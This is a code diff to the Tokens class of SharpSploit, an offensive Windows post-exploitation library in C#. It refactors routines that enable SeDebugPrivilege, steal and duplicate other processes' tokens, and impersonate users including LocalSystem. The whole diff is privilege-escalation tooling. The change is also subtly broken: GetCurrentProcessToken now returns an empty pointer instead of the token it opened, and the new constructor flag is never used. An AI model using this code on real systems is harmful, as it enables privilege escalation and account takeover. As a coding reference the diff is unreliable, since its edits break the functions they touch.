@@ -31,15 +31,9 @@ namespace SharpSploit.Credentials
         /// <summary>
         /// Creates the Tokens class, attempts to obtain the current process' token, and obtain the SeDebugPrivilege.
         /// </summary>
-        public Tokens()
+        public Tokens(bool EnableSeDebugPrivilege = true)
         {
-            IntPtr currentProcessToken = this.GetCurrentProcessToken();
-            if (currentProcessToken == IntPtr.Zero)
-            {
-                return;
-            }
-
-            this.EnableTokenPrivilege(ref currentProcessToken, "SeDebugPrivilege");
+            this.EnableCurrentProcessTokenPrivilege("SeDebugPrivilege");
         }
 
         ~Tokens()
@@ -77,13 +71,10 @@ namespace SharpSploit.Credentials
         public bool ImpersonateUser(string Username)
         {
             List<UserProcessToken> userProcessTokens = this.GetUserProcessTokensForUser(Username);
-            Console.WriteLine("Processes for " + Username + ": " + userProcessTokens.Count);
             foreach (UserProcessToken userProcessToken in userProcessTokens)
             {
-                Console.WriteLine("Attempting to impersonate: " + Username);
                 if (this.ImpersonateProcess((UInt32)userProcessToken.Process.Id))
                 {
-                    Console.WriteLine("Impersonated: " + WindowsIdentity.GetCurrent().Name);
                     return true;
                 }
             }
@@ -105,14 +96,13 @@ namespace SharpSploit.Credentials
             }
 
             Win32.WinBase._SECURITY_ATTRIBUTES securityAttributes = new Win32.WinBase._SECURITY_ATTRIBUTES();
-            IntPtr hDuplicateToken = IntPtr.Zero;
             if (!PInvoke.Win32.Advapi32.DuplicateTokenEx(
                     hProcessToken,
                     (UInt32)Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
                     ref securityAttributes,
                     Win32.WinNT._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
-                    Win32.WinNT.TOKEN_TYPE.TokenPrimary,
-                    out hDuplicateToken
+                    Win32.WinNT.TOKEN_TYPE.TokenImpersonation,
+                    out IntPtr hDuplicateToken
                 )
             )
             {
@@ -139,11 +129,8 @@ namespace SharpSploit.Credentials
         /// <returns>True if impersonation succeeds, false otherwise.</returns>
         public bool GetSystem()
         {
-            Console.WriteLine("Getting system...");
             SecurityIdentifier securityIdentifier = new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null);
             NTAccount systemAccount = (NTAccount)securityIdentifier.Translate(typeof(NTAccount));
-            Console.WriteLine("Impersonate " + systemAccount.ToString() + "...");
-
             return this.ImpersonateUser(systemAccount.ToString());
         }
 
@@ -166,7 +153,6 @@ namespace SharpSploit.Credentials
             List<Process> processes = ProcessId == 0 ?
                                         this.GetUserProcessTokens(true).Select(UPT => UPT.Process).ToList() :
                                         new List<Process> { Process.GetProcessById(ProcessId) };
-            Console.WriteLine("Elevated processes: " + processes.Count);
             foreach (Process process in processes)
             {
                 // Get PrimaryToken
@@ -425,14 +411,13 @@ namespace SharpSploit.Credentials
 
         private IntPtr GetCurrentProcessToken()
         {
-            IntPtr currentProcessToken = new IntPtr();
-            if (!PInvoke.Win32.Kernel32.OpenProcessToken(Process.GetCurrentProcess().Handle, Win32.Advapi32.TOKEN_ALL_ACCESS, out currentProcessToken))
+            if (!PInvoke.Win32.Kernel32.OpenProcessToken(Process.GetCurrentProcess().Handle, Win32.Advapi32.TOKEN_ALL_ACCESS, out IntPtr currentProcessToken))
             {
                 Console.Error.WriteLine("OpenProcessToken() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                 return IntPtr.Zero;
             }
-            OpenHandles.Add(currentProcessToken);
-            return currentProcessToken;
+            OpenHandles.Add(new IntPtr());
+            return new IntPtr();
         }
 
         private static bool TokenIsElevated(IntPtr hToken)
@@ -503,13 +488,23 @@ namespace SharpSploit.Credentials
             "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege",
             "SeUndockPrivilege", "SeUnsolicitedInputPrivilege" };
 
+        public bool EnableCurrentProcessTokenPrivilege(string Privilege)
+        {
+            IntPtr currentProcessToken = this.GetCurrentProcessToken();
+            if (currentProcessToken == IntPtr.Zero)
+            {
+                return false;
+            }
+            return EnableTokenPrivilege(ref currentProcessToken, Privilege);
+        }
+
         /// <summary>
         /// Enables a specified security privilege for a specified token. 
         /// </summary>
         /// <param name="hToken">Token to enable a security privilege for.</param>
         /// <param name="Privilege">Privilege to enable.</param>
         /// <returns>True if enabling Token succeeds, false otherwise.</returns>
-        public bool EnableTokenPrivilege(ref IntPtr hToken, string Privilege)
+        public static bool EnableTokenPrivilege(ref IntPtr hToken, string Privilege)
         {
             if (!Privileges.Contains(Privilege))
             {
@@ -522,17 +517,20 @@ namespace SharpSploit.Credentials
                 return false;
             }
 
-            Win32.WinNT._LUID_AND_ATTRIBUTES luidAndAttributes = new Win32.WinNT._LUID_AND_ATTRIBUTES();
-            luidAndAttributes.Luid = luid;
-            luidAndAttributes.Attributes = Win32.WinNT.SE_PRIVILEGE_ENABLED;
+            Win32.WinNT._LUID_AND_ATTRIBUTES luidAndAttributes = new Win32.WinNT._LUID_AND_ATTRIBUTES
+            {
+                Luid = luid,
+                Attributes = Win32.WinNT.SE_PRIVILEGE_ENABLED
+            };
 
-            Win32.WinNT._TOKEN_PRIVILEGES newState = new Win32.WinNT._TOKEN_PRIVILEGES();
-            newState.PrivilegeCount = 1;
-            newState.Privileges = luidAndAttributes;
+            Win32.WinNT._TOKEN_PRIVILEGES newState = new Win32.WinNT._TOKEN_PRIVILEGES
+            {
+                PrivilegeCount = 1,
+                Privileges = luidAndAttributes
+            };
 
             Win32.WinNT._TOKEN_PRIVILEGES previousState = new Win32.WinNT._TOKEN_PRIVILEGES();
-            UInt32 returnLength = 0;
-            if (!PInvoke.Win32.Advapi32.AdjustTokenPrivileges(hToken, false, ref newState, (UInt32)Marshal.SizeOf(newState), ref previousState, out returnLength))
+            if (!PInvoke.Win32.Advapi32.AdjustTokenPrivileges(hToken, false, ref newState, (UInt32)Marshal.SizeOf(newState), ref previousState, out _))
             {
                 Console.Error.WriteLine("AdjustTokenPrivileges() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                 return false;
